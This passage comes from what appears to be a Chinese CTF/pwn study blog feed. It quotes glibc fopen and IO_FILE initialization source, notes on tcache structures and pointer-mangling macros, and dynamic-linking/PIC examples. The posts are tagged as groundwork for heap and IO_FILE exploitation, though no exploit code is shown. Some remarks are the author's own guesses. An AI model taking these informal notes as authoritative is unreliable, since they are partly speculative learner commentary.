class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="b-IO-no-init-and-IO-old-init（genops-c）"><a href="#b-IO-no-init-and-IO-old-init（genops-c）" class="headerlink" title="b. _IO_no_init and _IO_old_init（genops.c）"></a>b. _IO_no_init and _IO_old_init（genops.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">	     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c-IO-new-file-init-internal-fileops-c"><a href="#c-IO-new-file-init-internal-fileops-c" class="headerlink" title="c._IO_new_file_init_internal(fileops.c)"></a>c._IO_new_file_init_internal(fileops.c)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="d-IO-new-file-init-internal-fileops-c"><a href="#d-IO-new-file-init-internal-fileops-c" class="headerlink" title="d._IO_new_file_init_internal(fileops.c)"></a>d._IO_new_file_init_internal(fileops.c)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">		    <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">	  omode = O_RDWR;</span><br><span class="line">	  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">	  oflags |= O_EXCL;</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">	  oflags |= O_CLOEXEC;</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* Ignore.  */</span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">			  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">	     to wide.  */</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">	  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">	  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">	      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">	      __set_errno (malloc_err);</span><br><span class="line">	      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">				   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment">		 This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment">		 for these.  */</span></span><br><span class="line">	      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">	      <span class="built_in">free</span> (ccs);</span><br><span class="line">	      __set_errno (EINVAL);</span><br><span class="line">	      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">	  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">	  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">	  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">	  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">	  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">	  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="库内二次封装的函数调用其的实现流程"><a href="#库内二次封装的函数调用其的实现流程" class="headerlink" title="库内二次封装的函数调用其的实现流程"></a>库内二次封装的函数调用其的实现流程</h1><blockquote>
<p>此函数是对库内标准IO接口的二次封装，淡然也有非IO函数调用上述标准IO接口</p>
<p>待续…</p>
</blockquote>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于tcache的一些基础概述</title>
    <url>/2024/08/10/%E5%85%B3%E4%BA%8Etcache%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="tcache相关结构体"><a href="#tcache相关结构体" class="headerlink" title="tcache相关结构体"></a>tcache相关结构体</h1><h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];<span class="comment">//数量统计</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//指针数组</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>此结构体为每个线程一个的tcache的管理器，管理级别上类似于arena。详情看源码，此结构体会在调用malloc的时候初始化。初始值全0。</p>
<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>此结构体为tcache的chunk，和一般的chunk比不会记录size字段，也许是不安全的隐患。但是会记录key字段，类似于canary（猜的）。entries数组记录了链表中最后一个chunk的地址，也就是说entries就是所谓的bin。</p>
<h1 id="关于PROTECT-PTR-pos-ptr-和REVEAL-PTR-ptr-宏定义"><a href="#关于PROTECT-PTR-pos-ptr-和REVEAL-PTR-ptr-宏定义" class="headerlink" title="关于PROTECT_PTR(pos, ptr)和REVEAL_PTR(ptr)宏定义"></a>关于PROTECT_PTR(pos, ptr)和REVEAL_PTR(ptr)宏定义</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>此宏定义会对bin链表中的指针进行混淆操作，具体方式就是低版本的指针的值与指针存储的位置&gt;&gt;12进行异或操作。若要恢复，就用结果值亦或指针存储的位置&gt;&gt;12即可，可得到正常的值。# tcache相关结构体</p>
<h1 id="tcache相关操作"><a href="#tcache相关操作" class="headerlink" title="tcache相关操作"></a>tcache相关操作</h1><blockquote>
<p>主要涉及到tcache_put和tcache_get，逻辑比较简单，不细说了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>关于动态链接</title>
    <url>/2024/08/16/%E5%85%B3%E4%BA%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<p>十分复杂，入坑需谨慎。。。。。</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>本次学习用的demo</p>
</blockquote>
<p>简述一下和静态链接的区别：静态链接在链接过程中就已经完成了重定位工作，因此可执行文件巨大，动态链接就是为了解决这一问题，找到了一种模块化的实现方法，就是可执行文件并不把所有库内段合并过来，而是在runtime的时候完成symbols的relocate操作，并且不同的进程也可以共享动态链接库也就是.so。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o Lib.so lib.c</span><br><span class="line">gcc -o program2 program2.c ./Lib.so</span><br><span class="line">gcc -o program1 program1.c ./Lib.so</span><br><span class="line"><span class="comment">/*program1*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    foobar(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*program2*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    foobar(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 注意这里的 &#x27;o&#x27; 应该是 &#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*lib.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foobar</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Printing from Lib.so: %d\n&quot;</span>, i); <span class="comment">// 注意这里的 &#x27;din&#x27; 应该是 &#x27;%d&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*lib.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIB_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIB_H</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foobar</span><span class="params">(<span class="type">int</span> i)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h1 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h1><blockquote>
<p>为了了解可执行文件（动态链接库）是如何在runtime进行relocate的需要理解什么是position-independent code，也就是地址无关代码。静态链接库是没有这个概念的，其加载地址在链接中已经确定了，所谓PIC就是解决动态共享库在加载时的模块地址冲突问题的，使其可以加载到任何位置，也就是说运行时地址自动分配，但是也会导致问题，同一个模块的代码装载到不同的位置，指令不能发生变化，否则无法使用其他共享模块。</p>
<p>需要注意一点的是，动态链接库实现代码重用，但是每一个进程是有一份数据部分的副本的。</p>
</blockquote>
<h2 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h2><blockquote>
<p>基本思想就是把指令中需要修改的部分提取出来跟数据放一块</p>
<p>所谓需要修改的无非就是外部模块的地址引用</p>
</blockquote>
<p>地址引用可以分为以下四种：</p>
<ul>
<li><p>模块内部函数调用跳转</p>
<p>比较简单，不做讨论，直接相对寻址即可，但是一开始貌似都是要到got表中的，但是本质区别是要不要做符号重定位。</p>
</li>
<li><p>模块内部数据访问，static关键字</p>
<p><img src="/img/mypic/PIC.png" alt="PIC"></p>
<p>书中是上面那样写的，但是我自己在ida编译了一个64位的程序，发现不管是内部模块的函数还是外部模块的函数都会转移到got表访问，数据回到got，函数会到got.plt</p>
</li>
<li><p>模块外部函数调用和跳转</p>
<blockquote>
<p>找got表</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">()</span>;  </span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br><span class="line">gcc -fPIC -shared -o pic.so pic.c</span><br><span class="line"> <span class="number">18</span> .got          <span class="number">00000028</span>  <span class="number">0000000000003f</span>d8  <span class="number">0000000000003f</span>d8  <span class="number">00002f</span>d8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> <span class="number">19</span> .got.plt      <span class="number">00000028</span>  <span class="number">0000000000004000</span>  <span class="number">0000000000004000</span>  <span class="number">00003000</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000003e48</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x0000000000001130</span></span><br><span class="line"><span class="number">0000000000003e50</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x00000000000010f0</span></span><br><span class="line"><span class="number">0000000000004028</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x0000000000004028</span></span><br><span class="line"><span class="number">0000000000003f</span>d8 R_X86_64_GLOB_DAT  b</span><br><span class="line"><span class="number">0000000000003f</span>e0 R_X86_64_GLOB_DAT  __cxa_finalize</span><br><span class="line"><span class="number">0000000000003f</span>e8 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable</span><br><span class="line"><span class="number">0000000000003f</span>f0 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable</span><br><span class="line"><span class="number">0000000000003f</span>f8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"><span class="number">0000000000004018</span> R_X86_64_JUMP_SLOT  ext</span><br><span class="line"><span class="number">0000000000004020</span> R_X86_64_JUMP_SLOT  ba</span><br></pre></td></tr></table></figure>
</li>
<li><p>模块外部的数据访问</p>
<blockquote>
<p>也是got表</p>
</blockquote>
</li>
<li><p>特别：</p>
<blockquote>
<p>对于定义在模块内部的全局变量，也通过got表进行处理。</p>
</blockquote>
<pre><code>      ## 关于数据段地址无关性
</code></pre>
</li>
</ul>
<p>因为每一个模块都有副本，因此不太需要关于共享这个问题，直接重定位即可。</p>
